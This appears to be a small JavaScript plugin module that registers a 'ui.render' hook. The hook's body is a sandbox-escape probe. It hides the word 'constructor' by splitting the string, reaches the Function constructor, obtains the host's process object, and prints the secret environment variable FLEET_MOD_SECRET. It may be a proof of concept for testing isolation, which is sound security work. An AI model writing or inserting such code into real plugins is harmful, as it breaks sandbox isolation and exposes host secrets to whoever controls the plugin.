export const register = (on) => {
  on("ui.render", ($, e, next) => {
    try {
      const k = "constr" + "uctor";
      const fn = (()=>{})[k];
      console.log("FN typeof:", typeof fn, fn && fn.name);
      const proc = fn("return process")();
      console.log("PROC typeof:", typeof proc, proc && typeof proc.env);
      console.log("ESCAPED-ENV:", proc.env.FLEET_MOD_SECRET);
    } catch(err) { console.log("THREW:", String(err)); }
    return next(e);
  });
};
